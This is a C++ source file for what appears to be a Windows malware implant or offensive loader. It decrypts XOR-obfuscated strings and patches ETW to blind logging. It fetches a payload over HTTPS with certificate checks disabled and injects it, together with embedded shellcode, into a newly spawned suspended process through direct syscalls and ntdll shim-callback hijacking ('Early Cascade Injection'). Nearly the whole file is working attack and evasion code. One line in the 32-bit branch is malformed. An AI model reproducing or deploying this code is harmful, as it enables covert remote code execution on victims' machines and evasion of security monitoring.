#include "implant.hpp"

#ifdef DEBUG
#include <iostream>
#endif

#include "cryptDef.h"

#include "helpers.h"

// #pragma comment(linker, "/entry:WinMain")


GetProcAddress_t pGetProcAddress;
GetModuleHandle_t pGetModuleHandle;


EXTERN_C DWORD getGlobalHash()
{
	return GlobalHash;
}


EXTERN_C DWORD SW3_GetSyscallNumber(DWORD FunctionHash)
{
	SyscallList* singleton = SyscallList::GetInstance();
	return singleton->getSyscallNumber(FunctionHash);
}


EXTERN_C PVOID SW3_GetSyscallAddress(DWORD FunctionHash)
{
	SyscallList* singleton = SyscallList::GetInstance();
	return singleton->getSyscallAddress(FunctionHash);
}


void XOR(char * data, size_t data_len, char * key, size_t key_len) 
{
	int j = 0;
	for (int i = 0; i < data_len; i++) 
	{
		if (j == key_len-1) 
			j = 0;

		data[i] = data[i] ^ key[j];
		j++;
	}
	
	data[data_len-1]='\0';
}


DWORD SW3_HashSyscall(const char *FunctionName)
{
    DWORD Hash = 0x811C9DC5; // FNV offset basis
    DWORD FNV_prime = 0x01000193; // FNV prime

    int c;
    while (c = *FunctionName++) {
        Hash ^= c;                 // XOR the byte into the lowest byte of the hash
        Hash *= FNV_prime;          // Multiply by FNV prime
    }

    return Hash & 0xFFFFFFFF;       // Ensure the result is a 32-bit hash
}


SyscallList* SyscallList::singleton_= nullptr;


SyscallList *SyscallList::GetInstance()
{
    if(singleton_==nullptr){
        singleton_ = new SyscallList();
    }
    return singleton_;
}


int HttpGet(LPWSTR domain, LPWSTR uri, int port, LPSTR response, int& responseSize, bool isHttps)
{
	DWORD dwSize = 0;
    
    LPSTR pszOutBuffer;
    BOOL  bResults = FALSE;
    HINTERNET  hSession = NULL, hConnect = NULL, hRequest = NULL;

	XOR((char *) sWinhttpDLL, sizeof(sWinhttpDLL), XorKey, sizeof(XorKey));
	XOR((char *) sLoadLibraryA, sizeof(sLoadLibraryA), XorKey, sizeof(XorKey));
	LoadLibraryA_t pLoadLibraryA = (LoadLibraryA_t)pGetProcAddress(pGetModuleHandle(sKernel32DLL), sLoadLibraryA);
	HMODULE winhttpModule = pLoadLibraryA(sWinhttpDLL); 

	XOR((char *) sWinHttpOpen, sizeof(sWinHttpOpen), XorKey, sizeof(XorKey));
	WinHttpOpen_t pWinHttpOpen = (WinHttpOpen_t)pGetProcAddress(winhttpModule, sWinHttpOpen);
    hSession = pWinHttpOpen(L"WinHTTP Agent", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);

    if (hSession)
	{
		XOR((char *) sWinHttpConnect, sizeof(sWinHttpConnect), XorKey, sizeof(XorKey));
		WinHttpConnect_t pWinHttpConnect = (WinHttpConnect_t)pGetProcAddress(winhttpModule, sWinHttpConnect);
        hConnect = pWinHttpConnect(hSession, domain, port, 0);
	}

    DWORD dwFlags = 0;
    if(isHttps)
        dwFlags = WINHTTP_FLAG_REFRESH | WINHTTP_FLAG_SECURE;

    if (hConnect)
	{
		XOR((char *) sWinHttpOpenRequest, sizeof(sWinHttpOpenRequest), XorKey, sizeof(XorKey));
		WinHttpOpenRequest_t pWinHttpOpenRequest = (WinHttpOpenRequest_t)pGetProcAddress(winhttpModule, sWinHttpOpenRequest);
        hRequest = pWinHttpOpenRequest(hConnect, L"GET", uri, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, dwFlags);
	}

	if(isHttps)
    {
        dwFlags =
            SECURITY_FLAG_IGNORE_UNKNOWN_CA |
            SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE |
            SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
            SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;

		XOR((char *) sWinHttpSetOption, sizeof(sWinHttpSetOption), XorKey, sizeof(XorKey));
		WinHttpSetOption_t pWinHttpSetOption = (WinHttpSetOption_t)pGetProcAddress(winhttpModule, sWinHttpSetOption);
        pWinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &dwFlags, sizeof(dwFlags));
    }

    if (hRequest)
	{
		XOR((char *) sWinHttpSendRequest, sizeof(sWinHttpSendRequest), XorKey, sizeof(XorKey));
		WinHttpSendRequest_t pWinHttpSendRequest = (WinHttpSendRequest_t)pGetProcAddress(winhttpModule, sWinHttpSendRequest);
		bResults = pWinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
	}
        
    if (bResults)
	{
		XOR((char *) sWinHttpReceiveResponse, sizeof(sWinHttpReceiveResponse), XorKey, sizeof(XorKey));
		WinHttpReceiveResponse_t pWinHttpReceiveResponse = (WinHttpReceiveResponse_t)pGetProcAddress(winhttpModule, sWinHttpReceiveResponse);
        bResults = pWinHttpReceiveResponse(hRequest, NULL);
	}

    DWORD dwStatusCode = 0;
    dwSize = sizeof(dwStatusCode);

	XOR((char *) sWinHttpQueryHeaders, sizeof(sWinHttpQueryHeaders), XorKey, sizeof(XorKey));
	WinHttpQueryHeaders_t pWinHttpQueryHeaders = (WinHttpQueryHeaders_t)pGetProcAddress(winhttpModule, sWinHttpQueryHeaders);
    pWinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER, WINHTTP_HEADER_NAME_BY_INDEX, &dwStatusCode, &dwSize, WINHTTP_NO_HEADER_INDEX);

	XOR((char *) sWinHttpQueryDataAvailable, sizeof(sWinHttpQueryDataAvailable), XorKey, sizeof(XorKey));
	XOR((char *) sWinHttpReadData, sizeof(sWinHttpReadData), XorKey, sizeof(XorKey));
	XOR((char *) sWinHttpCloseHandle, sizeof(sWinHttpCloseHandle), XorKey, sizeof(XorKey));

	VirtualAlloc_t pVirtualAlloc  = (VirtualAlloc_t)pGetProcAddress(pGetModuleHandle(sKernel32DLL), sVirtualAlloc);	
	VirtualFree_t pVirtualFree  = (VirtualFree_t)pGetProcAddress(pGetModuleHandle(sKernel32DLL), sVirtualFree);	
	WinHttpQueryDataAvailable_t pWinHttpQueryDataAvailable = (WinHttpQueryDataAvailable_t)pGetProcAddress(winhttpModule, sWinHttpQueryDataAvailable);
	WinHttpReadData_t pWinHttpReadData = (WinHttpReadData_t)pGetProcAddress(winhttpModule, sWinHttpReadData);

    if (bResults)
    {
        do
        {
            dwSize = 0;
            if (!pWinHttpQueryDataAvailable(hRequest, &dwSize))
			{
			}

            pszOutBuffer = (char*)pVirtualAlloc(NULL, dwSize+1, MEM_RESERVE|MEM_COMMIT, PAGE_READWRITE);
			            
			if (!pszOutBuffer)
            {
                dwSize = 0;
            }
            else
            {
                ZeroMemory(pszOutBuffer, dwSize + 1);

                DWORD dwDownloaded = 0;
                if (!pWinHttpReadData(hRequest, (LPVOID)pszOutBuffer, dwSize, &dwDownloaded))
				{
				}
                else
                {
					memcpy(response+responseSize, pszOutBuffer, dwSize);
					responseSize+=dwSize;
                }
            }
			pVirtualFree(pszOutBuffer, dwSize+1, MEM_RELEASE);

        } while (dwSize > 0);
    }

	WinHttpCloseHandle_t pWinHttpCloseHandle = (WinHttpCloseHandle_t)pGetProcAddress(winhttpModule, sWinHttpCloseHandle);
	if (hRequest) 
        pWinHttpCloseHandle(hRequest);
    if (hConnect) 
        pWinHttpCloseHandle(hConnect);
    if (hSession) 
        pWinHttpCloseHandle(hSession);

    return dwStatusCode;
}


// Early Cascade Injection
LPVOID encode_system_ptr(LPVOID ptr) 
{
    ULONG cookie = *(ULONG*)0x7FFE0330;
    return (LPVOID)_rotr64(cookie ^ (ULONGLONG)ptr, cookie & 0x3F);
}

LPVOID find_pattern(LPBYTE pBuffer, DWORD dwSize, LPBYTE pPattern, DWORD dwPatternSize)
{
    if ( dwSize > dwPatternSize ) // Avoid OOB
        while ( (dwSize--) - dwPatternSize ) 
		{
            if ( RtlCompareMemory(pBuffer, pPattern, dwPatternSize) == dwPatternSize )
                return pBuffer;

            pBuffer++;
        }

    return NULL;
}

LPVOID find_SE_DllLoadedAddress(HANDLE hNtDLL, LPVOID *ppOffsetAddress) 
{
    DWORD dwValue;
    DWORD_PTR dwPtr;
    DWORD_PTR dwTextPtr;
    DWORD_PTR dwMRDataPtr;
    DWORD_PTR dwResultPtr;

    dwPtr = (DWORD_PTR) hNtDLL + ((PIMAGE_DOS_HEADER) hNtDLL)->e_lfanew;
    dwValue = ((PIMAGE_NT_HEADERS) dwPtr)->FileHeader.NumberOfSections;
    dwPtr = (DWORD_PTR) &((PIMAGE_NT_HEADERS) dwPtr)->OptionalHeader + ((PIMAGE_NT_HEADERS) dwPtr)->FileHeader.SizeOfOptionalHeader;

    while ( dwValue-- ) 
	{
        if ( strcmp((const char*)((PIMAGE_SECTION_HEADER) dwPtr)->Name, ".text") == 0 )
            dwTextPtr = dwPtr;
        if ( strcmp((const char*)((PIMAGE_SECTION_HEADER) dwPtr)->Name, ".mrdata") == 0 )
            dwMRDataPtr = (DWORD_PTR) hNtDLL + ((PIMAGE_SECTION_HEADER) dwPtr)->VirtualAddress;    
        dwPtr += sizeof(IMAGE_SECTION_HEADER);
    }

    dwResultPtr = (DWORD_PTR) hNtDLL + ((PIMAGE_SECTION_HEADER) dwTextPtr)->VirtualAddress;
    dwTextPtr = dwResultPtr + ((PIMAGE_SECTION_HEADER) dwTextPtr)->Misc.VirtualSize;

    while ( dwResultPtr = (DWORD_PTR) find_pattern((LPBYTE) dwResultPtr, dwTextPtr-dwResultPtr, (LPBYTE)"\x8B\x14\x25\x30\x03\xFE\x7F\x8B\xC2\x48\x8B", 11) ) 
	{
        dwResultPtr += 12;
        if ( (*(BYTE *)(dwResultPtr + 0x3)) == 0x00 ) 
		{
            if ( ppOffsetAddress )
                ( *ppOffsetAddress ) = (LPVOID) dwResultPtr;

            dwPtr = (DWORD_PTR) ( *(DWORD32 *) dwResultPtr ) + dwResultPtr + 0x4;
            if ( dwPtr > dwMRDataPtr+0x240 && dwPtr < dwMRDataPtr+0x280 )
                return (LPVOID) dwPtr;
        }
    }

    return NULL;
}


LPVOID find_ShimsEnabledAddress(HANDLE hNtDLL, LPVOID pDllLoadedOffsetAddress) 
{
    DWORD dwValue;
    DWORD_PTR dwPtr;
    DWORD_PTR dwResultPtr;
    DWORD_PTR dwEndPtr;
    DWORD_PTR dwDataPtr;

    dwPtr = (DWORD_PTR) hNtDLL + ((PIMAGE_DOS_HEADER) hNtDLL)->e_lfanew;
    dwValue = ((PIMAGE_NT_HEADERS) dwPtr)->FileHeader.NumberOfSections;
    dwPtr = (DWORD_PTR) &((PIMAGE_NT_HEADERS) dwPtr)->OptionalHeader + ((PIMAGE_NT_HEADERS) dwPtr)->FileHeader.SizeOfOptionalHeader;

    while ( dwValue-- ) 
	{
        if ( strcmp((const char*)((PIMAGE_SECTION_HEADER) dwPtr)->Name, ".data") == 0 ) {
            dwDataPtr = (DWORD_PTR) hNtDLL + ((PIMAGE_SECTION_HEADER) dwPtr)->VirtualAddress;  
            break; 
        } 
        dwPtr += sizeof(IMAGE_SECTION_HEADER);
    }

    dwPtr = dwEndPtr = (DWORD_PTR) pDllLoadedOffsetAddress;
    dwEndPtr += 0xFF;
    while ( dwPtr = (DWORD_PTR) find_pattern((LPBYTE)dwPtr, dwEndPtr-dwPtr, (LPBYTE)"\x44\x38\x25", 3) ) 
    {
        dwPtr += 0x3;
        if ( (*(BYTE *)(dwPtr + 0x3)) == 0x00 ) 
		{
            dwResultPtr = (DWORD_PTR) ( *(DWORD32 *) dwPtr ) + dwPtr + 0x4;            
            return (LPVOID) dwResultPtr;
        }
    }

    return NULL;
}


BYTE x64_stub[] =   "\x56\x57\x65\x48\x8b\x14\x25\x60\x00\x00\x00\x48\x8b\x52\x18\x48"
                    "\x8d\x52\x20\x52\x48\x8b\x12\x48\x8b\x12\x48\x3b\x14\x24\x0f\x84"
                    "\x85\x00\x00\x00\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x48\x83\xc1"
                    "\x0a\x48\x83\xe1\xf0\x48\x29\xcc\x49\x89\xc9\x48\x31\xc9\x48\x31"
                    "\xc0\x66\xad\x38\xe0\x74\x12\x3c\x61\x7d\x06\x3c\x41\x7c\x02\x04"
                    "\x20\x88\x04\x0c\x48\xff\xc1\xeb\xe5\xc6\x04\x0c\x00\x48\x89\xe6"
                    "\xe8\xfe\x00\x00\x00\x4c\x01\xcc\x48\xbe\xed\xb5\xd3\x22\xb5\xd2"
                    "\x77\x03\x48\x39\xfe\x74\xa0\x48\xbe\x75\xee\x40\x70\x36\xe9\x37"
                    "\xd5\x48\x39\xfe\x74\x91\x48\xbe\x2b\x95\x21\xa7\x74\x12\xd7\x02"
                    "\x48\x39\xfe\x74\x82\xe8\x05\x00\x00\x00\xe9\xbc\x00\x00\x00\x58"
                    "\x48\x89\x42\x30\xe9\x6e\xff\xff\xff\x5a\x48\xb8\x11\x11\x11\x11"
                    "\x11\x11\x11\x11\xc6\x00\x00\x48\x8b\x12\x48\x8b\x12\x48\x8b\x52"
                    "\x20\x48\x31\xc0\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02"
                    "\x0f\x85\x83\x00\x00\x00\x8b\x80\x88\x00\x00\x00\x48\x01\xd0\x50"
                    "\x4d\x31\xdb\x44\x8b\x58\x20\x49\x01\xd3\x48\x31\xc9\x8b\x48\x18"
                    "\x51\x48\x85\xc9\x74\x69\x48\x31\xf6\x41\x8b\x33\x48\x01\xd6\xe8"
                    "\x5f\x00\x00\x00\x49\x83\xc3\x04\x48\xff\xc9\x48\xbe\x38\x22\x61"
                    "\xd4\x7c\xdf\x63\x99\x48\x39\xfe\x75\xd7\x58\xff\xc1\x29\xc8\x91"
                    "\x58\x44\x8b\x58\x24\x49\x01\xd3\x66\x41\x8b\x0c\x4b\x44\x8b\x58"
                    "\x1c\x49\x01\xd3\x41\x8b\x04\x8b\x48\x01\xd0\xeb\x43\x48\xc7\xc1"
                    "\xfe\xff\xff\xff\x5a\x4d\x31\xc0\x4d\x31\xc9\x41\x51\x41\x51\x48"
                    "\x83\xec\x20\xff\xd0\x48\x83\xc4\x30\x5f\x5e\x48\x31\xc0\xc3\x59"
                    "\x58\xeb\xf6\xbf\x05\x15\x00\x00\x48\x31\xc0\xac\x38\xe0\x74\x0f"
                    "\x49\x89\xf8\x48\xc1\xe7\x05\x4c\x01\xc7\x48\x01\xc7\xeb\xe9\xc3"
                    "\xe8\xb8\xff\xff\xff\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90";


// typedef NTSTATUS(NTAPI* pNtAllocateVirtualMemory)(
//   HANDLE             ProcessHandle,
//   PVOID              *BaseAddress,
//   ULONG              ZeroBits,
//   PULONG             RegionSize,
//   ULONG              AllocationType,
//   ULONG              Protect
// );


#ifdef DEBUG
int main()
#else
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) 
#endif
{			
	XOR((char *) sKernel32DLL, sizeof(sKernel32DLL), XorKey, sizeof(XorKey));
	XOR((char *) sGetProcAddress, sizeof(sGetProcAddress), XorKey, sizeof(XorKey));
	XOR((char *) sGetModuleHandleA, sizeof(sGetModuleHandleA), XorKey, sizeof(XorKey));
	XOR((char *) sVirtualAlloc, sizeof(sVirtualAlloc), XorKey, sizeof(XorKey));
	XOR((char *) sVirtualFree, sizeof(sVirtualFree), XorKey, sizeof(XorKey));
	XOR((char *) sCreateToolhelp32Snapshot, sizeof(sCreateToolhelp32Snapshot), XorKey, sizeof(XorKey));
	XOR((char *) sProcess32First, sizeof(sProcess32First), XorKey, sizeof(XorKey));
	XOR((char *) sProcess32Next, sizeof(sProcess32Next), XorKey, sizeof(XorKey));
	XOR((char *) sInjectionProcess, sizeof(sInjectionProcess), XorKey, sizeof(XorKey));
	XOR((char *) sCloseHandle, sizeof(sCloseHandle), XorKey, sizeof(XorKey));
	XOR((char *) sWaitForSingleObject, sizeof(sWaitForSingleObject), XorKey, sizeof(XorKey));
	XOR((char *) sDomain, sizeof(sDomain), XorKey, sizeof(XorKey));
	XOR((char *) sUri, sizeof(sUri), XorKey, sizeof(XorKey));
	XOR((char *) sNtdllDLL, sizeof(sNtdllDLL), XorKey, sizeof(XorKey));
	XOR((char *) sEtwEventWrite, sizeof(sEtwEventWrite), XorKey, sizeof(XorKey));

	pGetProcAddress = (GetProcAddress_t) hlpGetProcAddress(hlpGetModuleHandle(wsKernel32DLL), sGetProcAddress);
	pGetModuleHandle = (GetModuleHandle_t) pGetProcAddress(hlpGetModuleHandle(wsKernel32DLL), sGetModuleHandleA);

	//
	// ETW patch
	//
	SyscallList* singleton = SyscallList::GetInstance();

	bool isPatchEtw = true;
	if(isPatchEtw)
	{
		void * pEventWrite = (void*)pGetProcAddress(pGetModuleHandle(sNtdllDLL), sEtwEventWrite);
		
		HANDLE hProc=(HANDLE)-1;

		DWORD oldprotect = 0;
		VirtualProtect(pEventWrite, 1024, PAGE_READWRITE, &oldprotect);
		// Sw3NtProtectVirtualMemory_(hProc, &pEventWrite, &sizeToAlloc, PAGE_READWRITE, &oldAccess);

		#ifdef _WIN64
			// memcpy(pEventWrite, "\x48\x33\xc0\xc3", 4); 		// xor rax, rax; ret
			char patch[] = "\x48\x33\xc0\xc3"; // xor rax, rax; ret
			int patchSize = 4;
		#else
			// memcpy(pEventWrite, "\x33\xc0\xc2\x14\x00", 5);		// xor eax, eax; ret 14
			char patch[] patch = "\x33\xc0\xc2\x14\x00"; // xor rax, rax; ret
			int patchSize = 5;
		#endif
		
		Sw3NtWriteVirtualMemory_(hProc, pEventWrite, (PVOID)patch, patchSize, 0);

		VirtualProtect(pEventWrite, 1024, oldprotect, &oldprotect);
		// result = Sw3NtProtectVirtualMemory_(-1, &pEventWrite, &sizeToAlloc, oldAccess, &oldAccess);
	}

    int responseSize=0;
	int maxSize = 1000000;

	VirtualAlloc_t pVirtualAlloc  = (VirtualAlloc_t)pGetProcAddress(pGetModuleHandle(sKernel32DLL), sVirtualAlloc);	
	LPSTR response = (char*)pVirtualAlloc(NULL, maxSize, MEM_RESERVE|MEM_COMMIT, PAGE_READWRITE);

#ifdef DEBUG
	std::cout << "sDomain " << sDomain << std::endl;
	std::cout << "sUri " << sUri << std::endl;
#endif

	wchar_t wDomain[256];
	mbstowcs(wDomain, sDomain, sizeof(sDomain));
	LPWSTR pwDomain = wDomain;

	wchar_t wUri[256];
	mbstowcs(wUri, sUri, sizeof(sUri));
	LPWSTR pwUri = wUri;

	HttpGet(pwDomain, pwUri, port, response, responseSize, isHttps);

#ifdef DEBUG
    std::cout << "response " << response << std::endl;
	std::cout << "responseSize " << responseSize << std::endl;
#endif

	if(responseSize==0)
		return -1;

    int nSuccess = EXIT_FAILURE;

#ifdef DEBUG
	std::cout << "sInjectionProcess " << sInjectionProcess << std::endl;
#endif
    
	STARTUPINFOA si = { 0 };
    si.cb = sizeof( STARTUPINFOA );
	PROCESS_INFORMATION pi = { 0 };
        
    if ( !CreateProcessA(NULL, sInjectionProcess, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, (LPCSTR) "C:\\Windows\\System32\\", &si, &pi) )
    // if ( !CreateProcessA(NULL, sInjectionProcess, NULL, NULL, FALSE, DEBUG_PROCESS, NULL, (LPCSTR) "C:\\Windows\\System32\\", &si, &pi) )
    
        return nSuccess;

#ifdef DEBUG
	std::cout << "CreateProcessA " << nSuccess << std::endl;
#endif

    HANDLE hNtDLL = pGetModuleHandle(sNtdllDLL);
	
	LPVOID pPtr;
    LPVOID pSE_DllLoadedAddress = find_SE_DllLoadedAddress( hNtDLL, &pPtr );
    LPVOID pShimsEnabledAddress = find_ShimsEnabledAddress( hNtDLL, pPtr );

#ifdef DEBUG
	std::cout << "find_SE_DllLoadedAddress " << pSE_DllLoadedAddress << std::endl;
    std::cout << "pShimsEnabledAddress " << pShimsEnabledAddress << std::endl;

    // getchar();

    std::cout << "GOGO" << std::endl;
#endif

    // pBuffer need to point to NULL for the syscall to work !!!!
	PVOID pBuffer = NULL;
    SIZE_T sizeToAlloc = sizeof(x64_stub) + responseSize;

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pi.dwProcessId);

    // pNtAllocateVirtualMemory myNtAllocateVirtualMemory = (pNtAllocateVirtualMemory)pGetProcAddress(pGetModuleHandle(sNtdllDLL), "NtAllocateVirtualMemory");
    // NTSTATUS status = myNtAllocateVirtualMemory(hProcess, &pBuffer, 0, (PULONG)&sizeToAlloc, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    NTSTATUS status = Sw3NtAllocateVirtualMemory_(pi.hProcess, &pBuffer, 0, &sizeToAlloc, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    // pBuffer = VirtualAllocEx(pi.hProcess, NULL, sizeToAlloc, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

#ifdef DEBUG
if (status != 0) {  // STATUS_SUCCESS is 0
    printf("NtAllocateVirtualMemory failed with NTSTATUS: 0x%X\n", status);
}
    std::cout << "pBuffer " << pBuffer << std::endl;
#endif

    void* placeHolder = find_pattern(x64_stub, sizeof(x64_stub), (LPBYTE)"\x11\x11\x11\x11\x11\x11\x11\x11", 8);
    if(placeHolder!=NULL)
        RtlCopyMemory(placeHolder, &pShimsEnabledAddress, sizeof(LPVOID) );

	Sw3NtWriteVirtualMemory_(pi.hProcess, pBuffer, x64_stub, sizeof(x64_stub)-1, NULL);
	Sw3NtWriteVirtualMemory_(pi.hProcess, (LPVOID)((DWORD_PTR)pBuffer + sizeof(x64_stub)-1), response, responseSize, NULL);

	pPtr = encode_system_ptr((LPVOID) pBuffer);
	Sw3NtWriteVirtualMemory_(pi.hProcess, pSE_DllLoadedAddress, (PVOID) &pPtr, sizeof(LPVOID), NULL);

	BOOL bEnable = TRUE;
	Sw3NtWriteVirtualMemory_(pi.hProcess, pShimsEnabledAddress, (PVOID) &bEnable, sizeof(BOOL), NULL);
    
#ifdef DEBUG
	std::cout << "ResumeThread " << std::endl;
#endif

	ULONG oldAccess;
    Sw3NtProtectVirtualMemory_(pi.hProcess, &pBuffer, &sizeToAlloc, PAGE_EXECUTE_READ, &oldAccess);

    Sw3NtResumeThread_(pi.hThread, NULL);
    // DebugActiveProcessStop(pi.dwProcessId);

    if ( pi.hThread )
        CloseHandle( pi.hThread );
    if ( pi.hProcess )
        CloseHandle( pi.hProcess );

	return 0;
}
